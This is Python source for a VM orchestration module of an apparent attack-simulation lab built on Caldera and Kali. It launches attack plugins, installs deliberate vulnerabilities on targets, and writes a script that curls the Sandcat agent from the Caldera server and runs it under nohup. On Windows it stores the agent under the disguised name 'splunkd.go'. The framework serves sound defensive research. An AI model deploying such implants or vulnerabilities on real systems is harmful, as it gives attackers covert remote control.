#!/usr/bin/env python3

""" (Virtual) machine handling. Start, stop, create and destroy. Starting remote commands on them. """

import os
import time
from glob import glob

import requests
import straight.plugin

from app.config import MachineConfig, ExperimentConfig
from app.exceptions import ServerError, ConfigurationError
from app.calderacontrol import CalderaControl
from app.interface_sfx import CommandlineColors
from plugins.base.kali import KaliPlugin
from plugins.base.machinery import MachineryPlugin
from plugins.base.sensor import SensorPlugin
from plugins.base.vulnerability_plugin import VulnerabilityPlugin


class Machine():
    """ A virtual machine. Attacker or target. Abstracting stuff away. """

    def __init__(self, config, calderakey="ADMIN123"):
        """

        @param config: The machine configuration as dict
        @param calderakey: Key to the caldera controller
        """

        self.vm_manager = None
        self.attack_logger = None

        if isinstance(config, MachineConfig):
            self.config = config
        else:
            self.config = MachineConfig(config)

        # TODO: Read config from plugin
        if self.config.vmcontroller() == "vagrant":
            self.__parse_vagrant_config__()
        if self.config.vmcontroller() == "running_vm":
            self.__parse_running_vm_config__()

        self.caldera_server = None

        self.abs_machinepath_external = None

        self.abs_machinepath_external = os.path.join(self.vagrantfilepath, self.config.machinepath())
        # TODO Add internal machinepath path for within the VM (/vagrant/machinepath) for non-linux machines
        self.abs_machinepath_internal = os.path.join("/vagrant/", self.config.machinepath())

        if not os.path.exists(self.abs_machinepath_external):
            raise ConfigurationError(f"machinepath does not exist: {self.abs_machinepath_external}")

        self.load_machine_plugin()
        self.caldera_basedir = self.vm_manager.get_playground()

        self.calderakey = calderakey
        self.sensors = []   # Sensor plugins
        self.vulnerabilities = []  # Vulnerability plugins

    def __parse_vagrant_config__(self):
        """ Check if a file configured in the config is present """

        self.vagrantfilepath = os.path.abspath(self.config.vagrantfilepath())
        self.vagrantfile = os.path.join(self.vagrantfilepath, "Vagrantfile")
        if not os.path.isfile(self.vagrantfile):
            raise ConfigurationError(f"Vagrantfile not existing: {self.vagrantfile}")

    def __parse_running_vm_config__(self):
        """ Check if a file configured in the config is present """

        self.vagrantfilepath = os.path.abspath(self.config.vagrantfilepath())
        self.vagrantfile = os.path.join(self.vagrantfilepath, "Vagrantfile")

    def get_paw(self):
        """ Returns the paw of the current machine """
        return self.config.caldera_paw()

    def get_group(self):
        """ Returns the group of the current machine """
        return self.config.caldera_group()

    def destroy(self):
        """ Destroys the current machine """

        self.vm_manager.__call_destroy__()

    def create(self, reboot=True):
        """ Create a VM

        @param reboot: Reboot the VM during installation. Required if you want to install software
        """

        self.vm_manager.__call_create__(reboot)

    def reboot(self):
        """ Reboot a machine """

        if self.get_os() == "windows":
            self.vm_manager.remote_run("shutdown /r")
            self.vm_manager.__call_disconnect__()
            time.sleep(60)   # Shutdown can be slow....
        if self.get_os() == "linux":
            self.vm_manager.remote_run("reboot")
            self.vm_manager.__call_disconnect__()
        res = None
        while not res:
            time.sleep(5)
            res = self.vm_manager.__call_connect__()
            print("Re-connecting....")

    def up(self):  # pylint: disable=invalid-name
        """ Starts a VM. Creates it if not already created """

        self.vm_manager.__call_up__()

    def halt(self):
        """ Halts a VM """

        self.vm_manager.__call_halt__()

    def getuser(self):
        """ Gets the user of the current VM """

        return "Result " + str(self.vm_manager.__call_remote_run__("echo $USER"))

    def connect(self):
        """ command connection. establish it """

        return self.vm_manager.__call_connect__()

    def disconnect(self, connection):
        """ Command connection dis-connect """

        self.vm_manager.__call_disconnect__(connection)

    def remote_run(self, cmd, disown=False):
        """ Simplifies connect and run

        @param cmd: Command to run as shell command
        @param disown: run in background
        """

        return self.vm_manager.__call_remote_run__(cmd, disown)

    def kali_attack(self, attack, target, config: ExperimentConfig):
        """ Pick a Kali attack and run it

        @param attack: Name of the attack to run
        @param target: IP address of the target
        @param config: A full experiment config object that has the methog "kali_conf" (just in case I want to split the config later)
        @returns: The output of the cmdline attacking tool
        """

        def get_handlers(plugin) -> [KaliPlugin]:
            return plugin.produce()

        base = "plugins/**/*.py"

        plugin_dirs = set()
        for a_glob in glob(base, recursive=True):
            plugin_dirs.add(os.path.dirname(a_glob))

        for a_directory in plugin_dirs:
            plugins = straight.plugin.load(a_directory, subclasses=KaliPlugin)

            handlers = get_handlers(plugins)

            for plugin in handlers:
                name = plugin.get_name()
                if name == attack:
                    print(f"{CommandlineColors.OKBLUE}Running Kali plugin {name}{CommandlineColors.ENDC}")
                    syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                              "abs_machinepath_external": self.abs_machinepath_external}
                    plugin.set_sysconf(syscon)
                    plugin.set_machine_plugin(self.vm_manager)
                    plugin.__set_logger__(self.attack_logger)
                    plugin.__execute__([target], config.kali_conf(name))

    def load_machine_plugin(self):
        """ Loads the matching machine plugin """

        def get_handlers(a_plugin) -> [MachineryPlugin]:
            return a_plugin.produce()

        base = "plugins/**/*.py"

        plugin_dirs = set()
        for a_glob in glob(base, recursive=True):
            plugin_dirs.add(os.path.dirname(a_glob))

        for a_dir in plugin_dirs:
            plugins = straight.plugin.load(a_dir, subclasses=MachineryPlugin)

            handlers = get_handlers(plugins)

            for plugin in handlers:
                name = plugin.get_name()
                if name == self.config.vmcontroller():
                    print(f"{CommandlineColors.OKBLUE}Installing sensor: {name}{CommandlineColors.ENDC}")

                    syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                              "abs_machinepath_external": self.abs_machinepath_external}
                    plugin.set_sysconf(syscon)
                    plugin.__call_process_config__(self.config)
                    self.vm_manager = plugin
                    break

    def prime_sensors(self):
        """ Prime sensors from plugins (hard core installs that could require a reboot)

        A machine can have several sensors running. Those are defined in a list in the config. This primes the sensors

        """

        def get_handlers(a_plugin) -> [SensorPlugin]:
            return a_plugin.produce()

        base = "plugins/**/*.py"
        reboot = False

        plugin_dirs = set()
        for a_glob in glob(base, recursive=True):
            plugin_dirs.add(os.path.dirname(a_glob))

        for a_dir in plugin_dirs:
            plugins = straight.plugin.load(a_dir, subclasses=SensorPlugin)

            handlers = get_handlers(plugins)

            for plugin in handlers:
                name = plugin.get_name()
                if name in self.config.sensors():
                    print(f"{CommandlineColors.OKBLUE}Priming sensor: {name}{CommandlineColors.ENDC}")
                    syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                              "abs_machinepath_external": self.abs_machinepath_external,
                              "sensor_specific": self.config.raw_config.get(name, {})
                              }
                    plugin.set_sysconf(syscon)
                    plugin.set_machine_plugin(self.vm_manager)
                    plugin.setup()
                    reboot |= plugin.prime()
                    self.sensors.append(plugin)
                    print(f"{CommandlineColors.OKGREEN}Primed sensor: {name}{CommandlineColors.ENDC}")
        return reboot

    def install_sensors(self):
        """ Install sensors from plugins

        A machine can have several sensors running. Those are defined in a list in the config. This installs the sensors

        """

        for plugin in self.get_sensors():
            name = plugin.get_name()

            print(f"{CommandlineColors.OKBLUE}Installing sensor: {name}{CommandlineColors.ENDC}")
            syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                      "abs_machinepath_external": self.abs_machinepath_external,
                      "sensor_specific": self.config.raw_config.get(name, {})}
            plugin.set_sysconf(syscon)
            plugin.set_machine_plugin(self.vm_manager)
            plugin.setup()
            plugin.install()
            print(f"{CommandlineColors.OKGREEN}Installed sensor: {name}{CommandlineColors.ENDC}")
            # self.sensors.append(plugin)

    def get_sensors(self) -> [SensorPlugin]:
        """ Returns a list of running sensors """
        return self.sensors

    def start_sensors(self):
        """ Start sensors

        A machine can have several sensors running. Those are defined in a list in the config. This starts the sensors

        """
        for plugin in self.get_sensors():
            print(f"{CommandlineColors.OKBLUE}Starting sensor: {plugin.get_name()}{CommandlineColors.ENDC}")
            plugin.set_machine_plugin(self.vm_manager)
            plugin.start()
            print(f"{CommandlineColors.OKGREEN}Started sensor: {plugin.get_name()}{CommandlineColors.ENDC}")

    def stop_sensors(self):
        """ Stop sensors

        A machine can have several sensors running. Those are defined in a list in the config. This stops the sensors

        """

        for plugin in self.get_sensors():
            print(f"{CommandlineColors.OKBLUE}Stopping sensor: {plugin.get_name()}{CommandlineColors.ENDC}")
            plugin.set_machine_plugin(self.vm_manager)
            plugin.stop()
            print(f"{CommandlineColors.OKGREEN}Stopped sensor: {plugin.get_name()}{CommandlineColors.ENDC}")

    def collect_sensors(self, lootdir):
        """ Collect data from sensors

        A machine can have several sensors running. Those are defined in a list in the config. This collects the data from the sensors

        @param lootdir: Fresh created directory for loot
        """

        machine_specific_path = os.path.join(lootdir, self.config.vmname())
        os.mkdir(machine_specific_path)

        for plugin in self.get_sensors():
            print(f"{CommandlineColors.OKBLUE}Collecting sensor: {plugin.get_name()}{CommandlineColors.ENDC}")
            plugin.set_machine_plugin(self.vm_manager)
            plugin.__call_collect__(machine_specific_path)
            print(f"{CommandlineColors.OKGREEN}Collected sensor: {plugin.get_name()}{CommandlineColors.ENDC}")

    ############

    def install_vulnerabilities(self):
        """ Install vulnerabilities from plugins: The machine is not yet modified ! For that call start_vulnerabilities next

        A machine can have several vulnerabilities. Those are defined in a list in the config. This installs the vulnerabilities

        """

        def get_handlers(a_plugin) -> [SensorPlugin]:
            return a_plugin.produce()

        base = "plugins/**/*.py"

        plugin_dirs = set()
        for a_glob in glob(base, recursive=True):
            plugin_dirs.add(os.path.dirname(a_glob))

        for a_dir in plugin_dirs:
            plugins = straight.plugin.load(a_dir, subclasses=VulnerabilityPlugin)

            handlers = get_handlers(plugins)

            for plugin in handlers:
                name = plugin.get_name()
                print(f"Configured vulnerabilities: {self.config.vulnerabilities()}")
                if name in self.config.vulnerabilities():
                    print(f"{CommandlineColors.OKBLUE}Installing vulnerability: {name}{CommandlineColors.ENDC}")
                    syscon = {"abs_machinepath_internal": self.abs_machinepath_internal,
                              "abs_machinepath_external": self.abs_machinepath_external}
                    plugin.set_sysconf(syscon)
                    plugin.set_machine_plugin(self.vm_manager)
                    plugin.setup()
                    plugin.install(self.vm_manager)
                    self.vulnerabilities.append(plugin)

    def get_vulnerabilities(self) -> [SensorPlugin]:
        """ Returns a list of installed vulnerabilities """
        return self.vulnerabilities

    def start_vulnerabilities(self):
        """ Really install the vulnerabilities on the machine

        A machine can have vulnerabilities installed. Those are defined in a list in the config. This starts the vulnerabilities

        """
        for plugin in self.get_vulnerabilities():
            print(f"{CommandlineColors.OKBLUE}Activating vulnerability: {plugin.get_name()}{CommandlineColors.ENDC}")
            plugin.set_machine_plugin(self.vm_manager)
            plugin.start()

    def stop_vulnerabilities(self):
        """ Un-install the vulnerabilities on the machine

        A machine can have vulnerabilities installed. Those are defined in a list in the config. This stops the vulnerabilities

        """
        for plugin in self.get_vulnerabilities():
            print(f"{CommandlineColors.OKBLUE}Uninstalling vulnerability: {plugin.get_name()}{CommandlineColors.ENDC}")
            plugin.set_machine_plugin(self.vm_manager)
            plugin.stop()

    ############

    def getip(self):
        """ Returns the IP of the main ethernet interface of this machine """

        # TODO: Create special code to extract windows IPs

        # TODO: Find a smarter way to get the ip

        return self.vm_manager.get_ip()

    def install_caldera_server(self, cleanup=False, version="2.8.1"):
        """ Installs the caldera server on the VM

        @param cleanup: Remove the old caldera version. Slow but reduces side effects
        @param version: Caldera version to use. Check Caldera git for potential branches to use
        """
        # https://github.com/mitre/caldera.git
        print(f"{CommandlineColors.OKBLUE}Installing Caldera server {CommandlineColors.ENDC}")

        if cleanup:
            cleanupcmd = "rm -rf caldera;"
        else:
            cleanupcmd = ""

        cmd = f"cd {self.caldera_basedir}; {cleanupcmd}  git clone https://github.com/mitre/caldera.git --recursive --branch {version}; cd caldera; pip3 install -r requirements.txt"
        print(f"{CommandlineColors.OKGREEN}Caldera server installed {CommandlineColors.ENDC}")
        res = self.vm_manager.__call_remote_run__(cmd)
        return "Result installing caldera server " + str(res)

    def wait_for_caldera_server(self, timeout=6):
        """ Ping caldera server. return as soon as it is responding

        @param timeout: timeout in seconds
        """
        for i in range(timeout):
            time.sleep(10)
            caldera_url = "http://" + self.getip() + ":8888"
            caldera_control = CalderaControl(caldera_url, apikey=self.calderakey)
            print(f"{i}  Trying to connect to {caldera_url} Caldera API")
            try:
                caldera_control.list_adversaries()
            except requests.exceptions.ConnectionError:
                pass
            else:
                print("Caldera: All systems nominal")
                return True
        raise ServerError

    def start_caldera_server(self):
        """ Start the caldera server on the VM. Required for an attacker VM """
        # https://github.com/mitre/caldera.git

        print(f"{CommandlineColors.OKBLUE}Starting Caldera server {CommandlineColors.ENDC}")

        cmd = f"cd {self.caldera_basedir}; cd caldera ; nohup python3 server.py --insecure &"
        self.vm_manager.__call_remote_run__(cmd, disown=True)
        self.wait_for_caldera_server()
        print(f"{CommandlineColors.OKGREEN}Caldera server started. Confirmed it is running.  {CommandlineColors.ENDC}")

    def create_start_caldera_client_cmd(self):
        """ Creates a command to start the caldera client """

        playground = self.vm_manager.get_playground()

        if self.get_os() == "linux":
            cmd = f"""chmod +x caldera_agent.sh; nohup bash {playground}/caldera_agent.sh start &
                      """
        elif self.get_os() == "windows":
            if playground:
                playground = playground + "\\"  # Workaround for Windows: Can not set target dir for fabric-put in Windows. Only default (none=user) dir available.
            else:
                playground = ""
            # playground = self.vm_manager.get_playground()
            cmd = f"""
{playground}caldera_agent.bat
            """

        return cmd

    def start_caldera_client(self):
        """ Install caldera client. Required on targets """

        name = self.vm_manager.get_vm_name()
        print(f"{CommandlineColors.OKBLUE}Starting Caldera client {name} {CommandlineColors.ENDC}")

        if self.get_os() == "windows":
            # TODO: Do not mount but use ssh to copy

            url = "http://" + self.caldera_server + ":8888"
            caldera_control = CalderaControl(url, apikey=self.calderakey)
            caldera_control.fetch_client(platform="windows",
                                         file="sandcat.go",
                                         target_dir=self.abs_machinepath_external,
                                         extension=".go")
            dst = self.vm_manager.get_playground()
            src = os.path.join(self.abs_machinepath_external, "caldera_agent.bat")
            self.vm_manager.put(src, dst)
            src = os.path.join(self.abs_machinepath_external, "splunkd.go")  # sandcat.go local name
            self.vm_manager.put(src, dst)

            cmd = self.__install_caldera_service_cmd().strip()
            print(cmd)
            self.vm_manager.remote_run(cmd, disown=False)

        if self.get_os() == "linux":
            dst = self.vm_manager.get_playground()
            src = os.path.join(self.abs_machinepath_external, "caldera_agent.sh")
            self.vm_manager.put(src, dst)

            cmd = self.create_start_caldera_client_cmd().strip()

            print(cmd)
            self.vm_manager.remote_run(cmd, disown=True)

        print(f"{CommandlineColors.OKGREEN}Caldera client started {CommandlineColors.ENDC}")

    def get_os(self):
        """ Returns the OS of the machine """

        return self.config.os()

    def __install_caldera_service_cmd(self):
        playground = self.vm_manager.get_playground()

        if self.get_os() == "linux":
            return f"""
#!/bin/bash

# Installs and runs the caldera agent

# TODO: Respect start/stop commands

cd {playground}
server="http://{self.caldera_server}:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;
chmod +x sandcat.go;
nohup ./sandcat.go -server $server -group {self.config.caldera_group()} -v -paw {self.config.caldera_paw()} &
                    """
        if self.get_os() == "windows":
            if playground:    # Workaround for Windows: Can not set target dir for fabric-put in Windows. Only default (none=user) dir available.
                playground = playground + "\\"
            else:
                playground = ""
            url = "http://" + self.caldera_server + ":8888"
            caldera_control = CalderaControl(url, apikey=self.calderakey)
            filename = caldera_control.fetch_client(platform="windows",
                                                    file="sandcat.go",
                                                    target_dir=self.abs_machinepath_external,
                                                    extension=".go")
            return f"""
START {playground}{filename} -server {url} -group {self.config.caldera_group()} -paw {self.config.caldera_paw()}
            """.strip()

        raise Exception  # System type unknown

    def install_caldera_service(self):
        """ Install the caldera client as a service. For linux targets """

        # print("DELETEME ! " + sys._getframe().f_code.co_name)

        content = self.__install_caldera_service_cmd()

        print(f"{CommandlineColors.OKBLUE}Installing Caldera service {CommandlineColors.ENDC}")

        if self.get_os() == "linux":
            filename = os.path.join(self.abs_machinepath_external, "caldera_agent.sh")
        elif self.get_os() == "windows":
            filename = os.path.join(self.abs_machinepath_external, "caldera_agent.bat")
        with open(filename, "wt") as fh:
            fh.write(content)
        print(f"{CommandlineColors.OKGREEN}Installed Caldera service {CommandlineColors.ENDC}")

    def set_caldera_server(self, server):
        """ Set the local caldera server config """
        self.caldera_server = server

    def set_attack_logger(self, attack_logger):
        """ Configure the attack logger for this server

        @param attack_logger: The attack logger to set
        """

        self.attack_logger = attack_logger
